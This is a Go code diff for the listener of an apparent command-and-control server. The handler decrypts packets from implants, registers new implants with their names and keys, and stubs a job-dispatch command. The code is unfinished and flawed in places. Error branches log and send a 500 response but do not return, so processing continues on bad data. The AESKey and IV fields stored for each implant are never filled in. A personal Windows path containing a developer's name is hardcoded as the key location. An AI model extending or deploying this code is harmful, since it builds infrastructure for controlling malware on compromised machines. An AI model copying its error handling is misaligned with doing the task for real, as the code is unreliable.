@@ -23,13 +23,15 @@ type LS struct {
 }
 
 var (
-	agent_arr   []Common.ImplantContext
+	agent_arr   []Common.Implant
 	g_clientobj Common.Client
 )
 
 func ProcessRequest(c *gin.Context) {
 	var (
 		decryptedPayload []byte
+		AESKey           []byte
+		IV               []byte
 	)
 	body, err := io.ReadAll(c.Request.Body)
 	if err != nil {
@@ -38,29 +40,51 @@ func ProcessRequest(c *gin.Context) {
 	defer c.Request.Body.Close()
 
 	var data_package Common.Package
-	err = data_package.UnmarshalBinary(body)
+	err = data_package.UnmarshalHeader(body)
 	if err != nil {
 		log.Println("[Error] attempting to read data from http request", err)
-		c.JSON(http.StatusInternalServerError, "Internal Server Error")
-	}
-
-	decryptedPayload, err = Crypt.AESDecryptPayload(data_package, "C:\\Users\\Brendan Ortiz\\Documents\\GOProjcets\\AllSecure\\")
-	if err != nil {
-		log.Println("[error] attempting to decrypt payload")
 		c.JSON(http.StatusInternalServerError, "Internal Server Error")
 	}
 
 	var CMDID = binary.BigEndian.Uint32(data_package.CmdID)
 	switch CMDID {
 	case Common.CMD_Register:
+		var (
+			NewImplant Common.Implant
+		)
+
+		err = data_package.UnmarshalEncryptedMetaData(body)
+		if err != nil {
+			log.Println("[error] attempting to unmarshal encrypted metadata")
+			c.JSON(http.StatusInternalServerError, "Internal Server Error")
+		}
+
+		decryptedPayload, err = Crypt.AESDecryptPayload(data_package, "C:\\Users\\Brendan Ortiz\\Documents\\GOProjcets\\AllSecure\\")
+		if err != nil {
+			log.Println("[error] attempting to decrypt payload")
+			c.JSON(http.StatusInternalServerError, "Internal Server Error")
+		}
+
+		NewImplant.ImplantName = data_package.AgentName
+		NewImplant.AESKey = AESKey
+		NewImplant.IV = IV
+		NewImplant.Alive = true
+
+		agent_arr = append(agent_arr, NewImplant)
+
 		go func() {
 			err = RegisterAgent(decryptedPayload)
 			if err != nil {
 				log.Println("[error] attempting to initialize agent", err)
 			}
 		}()
+		break //CMD_Register
+
+	case Common.CMD_GET_JOB:
+		//TODO PARSE DATA THEN SEND JOB FUNCTION WAITING TO AGENT
+		log.Println("[info] in GET JOB")
 		break
-		//CMD_Register
+
 	default:
 		break
 	} //switch
